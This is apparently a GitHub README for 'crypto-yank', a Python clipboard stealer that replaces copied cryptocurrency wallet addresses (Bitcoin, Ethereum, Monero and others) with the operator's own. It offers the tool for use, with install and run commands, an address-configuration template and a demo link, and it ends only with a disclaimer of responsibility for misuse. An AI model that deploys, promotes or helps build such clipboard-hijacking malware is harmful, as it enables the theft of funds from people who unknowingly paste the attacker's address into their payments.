<h1 align='center'>crypto-yank 🏦📋</h1>
<h3 align='center'>A python written crypto currency clipboard stealer.</h3>

<img src='.github/demo.gif'></img>

### Features:

* Written in Python 3
* Support For: `Bitcoin (Legacy & Segwit),Etherum,Litecoin,Dash,Doge,Ripple and Monero.`
* Easy setup script & simple install.

### About:

**crypto-yank** is a clipboard stealer that monitors the clipboard for crypto addresses and replaces it with your own. If no address is found in the clipboard crypto-yank does nothing and remains waiting for a valid address to replace.

### Usage:

```shell
git clone https://github.com/jacques-andre/crypto-yank
cd crypto-yank
pip3 install -r requirements.txt 
python3 setup.py 
python3 crypto-yank.py
```
##### Optional args for `crypto-yank.py`:

```
--verbose 
```

If you don't want to use the setup script you can provide your own `addresses.json` in the following format.

Example [addresses.json](https://github.com/jacques-andre/crypto-yank/blob/master/addresses.json):

```json
{
    "legacy_btc": "leg_ad",
    "segwit_btc": "seg_ad",
    "xmr": "xmr_ad",
    "eth": "eth_ad",
    "lite": "lite_ad",
    "dash": "dash_ad",
    "ripple": "ripple_ad",
    "doge": "doge_ad"
}
```
Once this file is created in the same directory as `crypto-yank.py` you can run `crypto-yank.py` to start monitoring.

### Demo:

### [Video](https://vimeo.com/437961025)

### Requirements:

[requirements.txt](https://github.com/jacques-andre/crypto-yank/blob/master/requirements.txt)

```
pyperclip==1.8.0
```

### Todo:
- Add more cryptos!

### License
[GPLv3](https://github.com/jacques-andre/crypto-yank/blob/master/LICENSE)
<hr>

**Warning**

We are not responsible for any misuse or damage caused by this program. Use this tool at your own risk!

